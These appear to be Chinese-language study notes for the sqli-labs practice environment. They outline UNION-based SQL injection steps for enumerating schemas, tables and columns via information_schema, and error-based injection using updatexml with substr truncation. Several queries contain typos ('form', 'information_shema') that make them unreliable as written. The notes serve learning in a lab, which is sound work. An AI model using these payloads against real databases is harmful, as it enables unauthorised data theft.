# sql-labs
----------------
## 获取到数据的步骤
1. 确认注入点
2. 联合查询获取数据库名 union select group_concat(schema_name) form information_schema.schemata
3. 获取数据表名 union select group_concat(table_name) form information_schema.tables where table_schema=databases()
4. 获取数据表字段名 union select group_concat(column_name) form information_shema.columns where table_name=''
##
substr及报错注入  
1.updatexml(XML_document(string),xpath,new_value(替换查找到的值))  
样例 
	updatexml(1,concat(0x7e,(select database()),0x7e),1)  
由于此函数限制输出为32位故需要使用substr函数对输出进行截断  
样例
	updatexml(1,concat(0x7e,substr((select database() limit 1,1),1),0x7e),1)

## les1

